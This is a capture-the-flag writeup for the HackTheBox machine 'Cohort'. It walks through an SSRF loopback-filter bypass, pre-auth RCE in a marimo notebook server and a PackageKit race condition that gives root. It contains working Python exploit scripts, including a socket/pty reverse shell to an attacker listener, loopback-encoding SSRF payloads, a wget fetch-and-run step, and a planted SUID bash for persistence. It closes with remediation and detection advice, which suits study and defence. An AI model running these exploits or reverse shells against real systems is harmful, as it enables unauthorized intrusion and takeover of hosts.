# HTB "Cohort" — Detailed Writeup

**Target:** `<target-ip>` (Ubuntu 24.04, kernel 6.8.0-136-generic, x86_64)
**Attacker:** `<your-tun0-ip>` (Kali)
**Difficulty:** Medium
**Flags:** `user.txt`, `root.txt`

> Replace `<target-ip>`, `<your-tun0-ip>`, and `1be3782a8afd3ad5` throughout with your actual session values — these change on every machine reset.

---

## 1. Summary

Cohort chains a web-layer SSRF with two real, documented 2026 CVEs:

1. **SSRF** in a "URL source validator" feature (`/api/validate`) — a naive loopback blocklist is bypassed to reach internal-only services.
2. **CVE-2026-39987** — an unauthenticated WebSocket PTY endpoint in **marimo** (a reactive Python notebook server), giving pre-auth RCE.
3. **CVE-2026-41651 ("Pack2TheRoot")** — a TOCTOU race in **PackageKit**'s D-Bus transaction handling, giving root.

No custom exploit development is required for either CVE — the difficulty is in the discovery chain and correctly adapting public PoCs to this environment's quirks.

| Stage | Technique | Result |
|---|---|---|
| Edge | SSRF via `/api/validate`, loopback-alias bypass | Read internal `/status` config |
| Recon | Config leak reveals hidden vhost | Found internal marimo notebook server |
| Foothold | CVE-2026-39987 — unauth `/terminal/ws` | RCE as `marimo` (uid 1000) |
| Pivot | `setsid` + Python `pty` reverse shell | Stable shell, `user.txt` |
| Privesc | CVE-2026-41651 — PackageKit TOCTOU | SUID bash, `euid=0`, `root.txt` |

---

## 2. Reconnaissance

### 2.1 Port scan

```bash
nmap -sCV -p- <target-ip> -oN nmap-full
```

Only `443/tcp` (HTTPS, nginx) is exposed. No SSH, no other services — the entire attack surface is the web app. The TLS certificate is a **wildcard** (`*.cohort.htb`), which is the first hint that more than one vhost exists behind this single IP.

### 2.2 Web / vhost enumeration

The main site (`https://cohort.htb/`) is a single-page app; its JS bundle is obfuscated, so directory/vhost fuzzing is more productive than reading the code.

**Directory fuzzing** — watch for wildcard responses (this app returns a uniform response for many nonexistent paths, so gobuster/ffuf will refuse to run or flood with false positives until you filter it out):

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -u https://cohort.htb/FUZZ \
  -fs <wildcard-response-size> -k -t 50
```

This surfaces `portal.html` — a "Client Insights" page whose whole purpose is letting a visitor submit a URL for the server to fetch.

**vhost fuzzing** (used later, after the SSRF leak points to a specific hidden vhost — but worth running broadly too):
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://cohort.htb -H "Host: FUZZ.cohort.htb" \
  -fs <wildcard-response-size> -k -t 50
```

---

## 3. SSRF in `/api/validate`

### 3.1 Confirming the primitive

`portal.html` POSTs JSON to `/api/validate`, which fetches the given URL server-side and returns a status/preview:

```bash
curl -k -s -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://example.com","format":"csv"}'
```

A `200 OK` with fetched content in the `preview` field confirms the server makes the outbound request itself — classic SSRF.

### 3.2 Bypassing the loopback filter

The app explicitly rejects obvious loopback strings (`127.0.0.1`, `localhost`) with the message *"Internal or loopback addresses are not permitted."* The blocklist is a literal string match, not IP-aware — so alternate encodings of the same address slip through:

```bash
curl -k -s -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0.0.0.0/status"}'
```

Other equivalent bypasses that also work against this kind of naive blocklist, useful if one specific alias is filtered:
```
http://0x7f.0x0.0x0.0x1     (hex)
http://0177.0.0.1           (octal)
http://2130706433           (decimal)
http://127.1                (short form)
```

This reaches the internal `/status` endpoint, which returns `403` when hit externally but is fully readable once the request originates from the server itself.

**Notes on this endpoint's behavior, useful for further probing:**
- Only `http`/`https` schemes are accepted — `file://` is explicitly rejected (`"Only http and https sources are supported."`), so local file read via this SSRF isn't possible.
- The `preview` field is truncated to roughly 4KB — fine for small JSON/config responses, not useful for pulling large files.
- The `format` field (csv/json/ndjson/parquet) isn't validated at this stage — parsing by format likely only matters in a separate "reconciliation" step, not in `/validate` itself.

---

## 4. Internal vhost discovery

The leaked `/status` payload is a service-discovery/upstream config dump:

```json
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    {"name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort"},
    {"name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000"},
    {"name": "notebooks", "host": "nb-1be3782a8afd3ad5.cohort.htb", "target": "127.0.0.1:8888",
     "note": "internal analyst workspace, not for external use"}
  ]
}
```

The `notebooks` upstream is the key finding — an internal-only vhost pointing at port 8888, explicitly marked as not for external use.

Add it to `/etc/hosts` (HTB machines require this — no real DNS resolution):
```bash
echo "<target-ip> nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
curl -k -I https://nb-1be3782a8afd3ad5.cohort.htb/
```

The vhost serves **marimo**, a reactive Python notebook. A login page (`/auth/login`) asks for a password/token — this turns out to be a decoy; the actual exploited route bypasses authentication entirely.

---

## 5. CVE-2026-39987 — Pre-Auth RCE in marimo

**CVSS 4.0: 9.3 (Critical)** · Affects marimo ≤ 0.20.4, fixed in 0.23.0 (April 2026).

### 5.0 Fingerprinting the marimo version

Before running any exploit, confirm the exact version — the CVE only applies to ≤ 0.20.4. There are several ways to pull this without authenticating:

**1. Check the homepage source for a version string or asset hash:**
```bash
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/ | grep -iE "marimo|version"
```
marimo's frontend often embeds its version in a meta tag, a JS bundle filename, or an inline config blob in the initial HTML payload.

**2. Check static asset paths — marimo serves versioned JS/CSS bundles:**
```bash
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/ | grep -oE '/(assets|static)/[a-zA-Z0-9_./-]*\.(js|css)'
```
Pull one of those files and grep it for a version string:
```bash
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/assets/<bundle>.js | grep -oE '"version":"[0-9.]+"'
```

**3. Trigger a 404 or malformed request — marimo (like many Python web apps) sometimes leaks its version in error pages or debug output:**
```bash
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/@file/doesnotexist
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/nonexistent-route-xyz
```
Look for a stack trace, a `Server` header, or an error template that names the package and version.

**4. Check response headers directly:**
```bash
curl -sk -I https://nb-1be3782a8afd3ad5.cohort.htb/
```
Some marimo deployments set a custom header (or the `Server`/`X-Powered-By` header) identifying the app and version — worth checking even though it's not guaranteed.

**5. Cross-reference with the public changelog** once you have a version number or a narrow range, to confirm it falls at or below 0.20.4:
```bash
curl -s https://raw.githubusercontent.com/marimo-team/marimo/main/CHANGELOG.md | less
```
or check the GitHub releases page directly in a browser.

Once confirmed ≤ 0.20.4, proceed to the exploit below.

### 5.1 Root cause

The terminal WebSocket endpoint, `/terminal/ws`, does not call the same auth validation function that the regular `/ws` endpoint enforces. It only checks the app's running mode and platform support before calling `pty.fork()` to spawn a real system shell. **One unauthenticated WebSocket connection is a full interactive PTY.**

### 5.2 The PoC — first shell

Public PoCs for this CVE that send JSON-encoded command frames **do not work** — the PTY expects **raw input bytes** terminated by `\n`, exactly as a real terminal emulator would send them. Here is the working PoC, from confirming code execution through to a stable reverse shell.

**Step 1 — install dependency:**
```bash
pip install websocket-client --break-system-packages
```

**Step 2 — confirm unauthenticated RCE** (`poc_confirm.py`):
```python
import websocket, ssl, time

TARGET = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"
ORIGIN = "https://nb-1be3782a8afd3ad5.cohort.htb"

ws = websocket.create_connection(
    TARGET,
    timeout=5,
    origin=ORIGIN,
    sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False}
)

time.sleep(1)  # let startup PTY output drain
ws.send(b"id; hostname; uname -a\n")   # RAW bytes + newline, NOT JSON
time.sleep(1)

try:
    while True:
        data = ws.recv()
        if not data:
            break
        print(data, end="")
except Exception:
    pass
```

Run it:
```bash
python3 poc_confirm.py
```

Expected output — confirms code execution as the `marimo` user with zero credentials:
```
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
cohort
Linux cohort 6.8.0-136-generic #136-Ubuntu SMP ... x86_64 GNU/Linux
```

**Step 3 — stabilize into a reverse shell.**

A naive `bash -i >& /dev/tcp/...` dies the moment the WebSocket closes — marimo tears down the PTY master, and the resulting SIGHUP kills the shell's whole process group. The fix is to detach the payload into its own session with `setsid`, so it survives independently of the dying PTY, and to spawn a proper TTY via Python's `pty` module (guaranteed present, since marimo itself runs on Python 3):

Start a listener first:
```bash
nc -lvnp 4444
```

`poc_shell.py`:
```python
import websocket, ssl, time

TARGET = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"
ORIGIN = "https://nb-1be3782a8afd3ad5.cohort.htb"
LHOST = "<your-tun0-ip>"
LPORT = 4444

ws = websocket.create_connection(
    TARGET,
    timeout=5,
    origin=ORIGIN,
    sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False}
)

time.sleep(1)

cmd = (
    f'setsid python3 -c \'import socket,subprocess,os,pty;'
    f's=socket.socket();s.connect(("{LHOST}",{LPORT}));'
    f'[os.dup2(s.fileno(),f) for f in (0,1,2)];'
    f'pty.spawn("/bin/bash")\' &\n'
).encode()

ws.send(cmd)
time.sleep(2)

try:
    while True:
        data = ws.recv()
        if not data:
            break
        print(data, end="")
except Exception:
    pass
```

Run it:
```bash
python3 poc_shell.py
```

Your `nc -lvnp 4444` listener catches a connection that survives the WebSocket/script exiting:
```
connect to [<target-ip>] from (UNKNOWN) [<target-ip>] <port>
marimo@cohort:~$
```

**Step 4 — stabilize the TTY further (optional but recommended)** for a usable interactive shell (tab-completion, arrow keys, proper `Ctrl+C`):
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# then Ctrl+Z
stty raw -echo; fg
# press Enter twice
```

**Step 5 — grab user.txt:**
```bash
whoami
cat ~/user.txt
```

---

## 6. Privilege Escalation — CVE-2026-41651 ("Pack2TheRoot")

**CVSS 3.1: 8.8** · PackageKit 1.0.2 → 1.3.4 vulnerable, fixed in 1.3.5.

### 6.1 Enumeration

From the `marimo` shell:
```bash
dpkg -l | grep -i packagekit
pkcon --version
```

Confirms an affected version, and that the daemon is live on the system D-Bus (running as root):
```
org.freedesktop.PackageKit   <pid>  packagekitd  root  :1.19  packagekit.service
```

### 6.2 Root cause

A TOCTOU race across three bugs in `src/pk-transaction.c`:

1. **Unconditional flag overwrite** — `InstallFiles()` writes caller-supplied flags into the transaction's cached flags even while a transaction is already running/authorized.
2. **Silent invalid state transition** — an illegal `RUNNING → WAITING_FOR_AUTH` transition is dropped by `pk_transaction_set_state()`, but the corrupted flags persist regardless.
3. **Late flag read at dispatch** — the actual install, run via a GLib idle callback (`pk_transaction_run()`), reads the cached flags and file paths at *execution* time, not at the time authorization was originally checked.

The `PK_TRANSACTION_FLAG_SIMULATE` flag (`0x4`) skips the polkit authorization check entirely, since a simulated install is assumed harmless. By sending two `InstallFiles()` calls back-to-back — one `SIMULATE`, one real — before the daemon's main loop processes either, the real (unauthorized) install's flags and paths get picked up by the already-authorized simulated transaction slot:

```
1. CreateTransaction()
2. InstallFiles(SIMULATE=0x4, dummy.deb)      → polkit skipped, state=READY, idle queued
3. InstallFiles(NONE=0x0, payload.deb)        → flags+paths overwritten, state rollback ignored
4. idle fires → pk_transaction_run() reads NONE + payload.deb
5. dpkg installs payload as root → postinst runs as root
6. postinst: install -m 4755 /bin/bash /tmp/.suid_bash
```

Both calls land in the daemon's socket before the idle callback fires — there's no actual race to win. `polkitd` returns `NOT_AUTHORIZED` for the second call, but the install has already been dispatched by then; that error is expected noise, not a failure.

### 6.3 Exploitation

No compiler toolchain on the box — build the exploit on Kali and transfer the binary:

```bash
sudo apt install -y git make build-essential libglib2.0-dev
git clone https://github.com/Vozec/CVE-2026-41651
cd CVE-2026-41651 && make
```

Serve it from Kali:
```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

Fetch and run from the `marimo` shell:
```bash
busybox wget -O /home/marimo/p2r http://<your-tun0-ip>:8000/cve-2026-41651
chmod +x /home/marimo/p2r
/home/marimo/p2r
```

Expected output:
```
CVE-2026-41651 — PackageKit TOCTOU LPE
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-<pid>.deb
[+] payload : /tmp/.pk-payload-<pid>.deb
[*] Transaction : /2_<id>
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[!] PK error 48: Failed to obtain authentication.   ← expected, not a failure
[*] Finished (exit=2, 0 ms)
[*] Polling for payload (120 s max)...
[+] SUCCESS — SUID bash at t+<ms>ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
```

The daemon may SIGABRT shortly after (a duplicate `Finished` signal assertion) — harmless; by that point the SUID binary is already on disk, and `packagekitd` re-activates on its next D-Bus request.

### 6.4 Root

```bash
/tmp/.suid_bash -p
id
cat /root/root.txt
```

The SUID binary persists on disk — any future shell can re-elevate instantly without re-running the exploit:
```bash
/tmp/.suid_bash -p -c 'id; cat /root/root.txt'
```

---

## 7. Attack Chain Summary

```
internet
  └─ nginx :443 (wildcard *.cohort.htb)
       ├─ SPA + /api/validate  ── SSRF (0.0.0.0 bypass) ──> internal /status (403→readable)
       └─ nb-1be3782a8afd3ad5.cohort.htb → 127.0.0.1:8888
            └─ marimo 0.20.4
                 └─ CVE-2026-39987: unauth /terminal/ws PTY (raw bytes + \n)
                      └─ setsid python pty reverse shell → marimo (uid 1000)
                           └─ user.txt
                           └─ CVE-2026-41651 Pack2TheRoot (PackageKit TOCTOU)
                                └─ SIMULATE auth bypass → postinst as root
                                     └─ /tmp/.suid_bash -p → euid 0 → root.txt
```

---

## 8. Remediation

**SSRF (`/api/validate`)**
- Replace the blocklist with a strict allowlist of permitted destinations.
- Reject all loopback representations: `127.0.0.0/8`, `0.0.0.0/8`, `::1`, `::`, plus hex/octal/decimal encodings — resolve the hostname and validate the actual IP, not the literal string.
- Restrict to `http`/`https` only (already partially done here); consider also blocking link-local/metadata ranges (`169.254.0.0/16`).
- Run the fetcher in an isolated network namespace or through an egress proxy with its own allowlist, separate from the app's own network.

**marimo**
- Upgrade to ≥ 0.23.0.
- Never expose a notebook server directly, even on an "internal-only" segment — put it behind an authenticated reverse proxy at minimum.
- Enforce authentication uniformly across every WebSocket route, not just HTTP ones — a route-by-route audit would have caught this.

**PackageKit**
- Upgrade to ≥ 1.3.5, or the corresponding distro backport.
- If package installation isn't needed at runtime on a production host, disable and mask `packagekitd` entirely.
- Require explicit admin authentication at the polkit policy level for all package-install actions, including simulated ones.

**General**
- Internal service discovery/status endpoints should never be reachable from the public edge, even indirectly through another service's SSRF.
- Avoid a single wildcard certificate covering every vhost — it makes hidden subdomains easier to infer are worth searching for, and offers no isolation if one vhost is compromised.

---

## 9. Detection / IOCs

- **Network:** WebSocket handshakes to `/terminal/ws` (or any WS route) with no associated authenticated session.
- **Process:** `packagekitd` spawning `dpkg-deb`/`postinst` chains referencing paths under `/tmp`, `/var/tmp`, or `/dev/shm`.
- **Filesystem:** unexpected SUID binaries in world-writable directories (e.g. `/tmp/.suid_bash`), stray `.deb` files under `/tmp`.
- **Behavioral:** any `bash` process with `euid=0` whose parent is not a standard login/session manager (`sudo`, `su`, `sshd`, PAM).
- **Logs:** `journalctl -u packagekit` for repeated assertion crashes/restarts — a strong signal of this exploit being attempted.
